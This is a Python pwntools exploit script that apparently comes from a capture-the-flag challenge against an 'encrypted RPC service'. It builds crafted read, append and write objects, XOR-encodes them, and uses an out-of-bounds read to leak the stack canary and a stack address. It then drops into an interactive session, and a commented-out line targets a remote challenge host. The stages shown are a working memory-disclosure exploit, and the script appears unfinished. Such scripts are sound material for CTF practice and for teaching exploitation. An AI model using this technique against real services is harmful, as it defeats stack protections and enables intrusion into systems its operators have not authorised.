#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from random import randrange, seed
import array
import numpy as np
import os
from enum import Enum

class Type(Enum):
	READ_T = 0
	WRITE_T = 1
	APPEND_T = 2
	END_T = 3

MAX_SIZE = 0x100
WELCOME = 'Welcome to encrypted RPC service!\n'
SEND = 'Send encrypted object:\n'
DATA = 'data: '

def make_obj(type, size = 0, data = b'-' * MAX_SIZE):
	return p32(type.value) + p32(size) + data

def make_read(size = MAX_SIZE, data = b'r' * MAX_SIZE):
	return make_obj(Type.READ_T, size, data)

def make_write():
	return make_obj(Type.WRITE_T)

def make_append(size = MAX_SIZE, data = b'a' * MAX_SIZE):
	return make_obj(Type.APPEND_T, size, data)

def make_end():
	return make_obj(Type.END_T)

def make_data(offset):
	data = make_read()
	data += make_append(offset)
	data += make_write()
	return data

def memfrob(s):
	return (np.frombuffer(s, dtype=np.uint8) ^ 42).tobytes()

def connect_remote():
	return remote('h4x.0x04.net', 1337)

def connect_test():
	cmd = 'gcc -fstack-protector test.c -o test'
	os.system(cmd)
	return process("./test", aslr = False)

def connect_target():
	return process("./target")	

def send(r, msg):
	r.send(memfrob(msg))

def finish(r):
	#send(r, make_end())
	#send(r, make_write())
	r.interactive()

def get_canary(r):
	offset = 3
	msg = make_data(offset)
	#print('data', msg)
	#print(len(WELCOME) + 3 * len(SEND) + len(DATA) + MAX_SIZE + 2)
	send(r, msg)
	r.recvn(len(WELCOME + 3 * SEND + DATA) + MAX_SIZE)
	r.recvn(6 + offset)
	canary = b"\x00" + r.recvn(7)
	info("canary: 0x{:016x}".format(u64(canary)))
	r.clean()
	return canary

def get_stack(r):
	offset = 3 + 31
	msg = make_data(offset)
	send(r, msg)
	r.recvn(len(2 * SEND + DATA) + MAX_SIZE + 25 + 31)
	stack = u64(r.recvn(6) + b"\x00\x00")
	stack -= 0x128
	info("stack: 0x{:016x}".format(stack))
	r.clean()
	return stack

def main():
	#r = connect_remote()
	#r = connect_test()
	r = connect_target()
	canary = get_canary(r)
	stack = get_stack(r)

	#check_canary(r, canary)

	#gdb.attach(r,  gdbscript = "display/10i $pc\nb *0")
	finish(r)

if __name__ == '__main__':
	main()
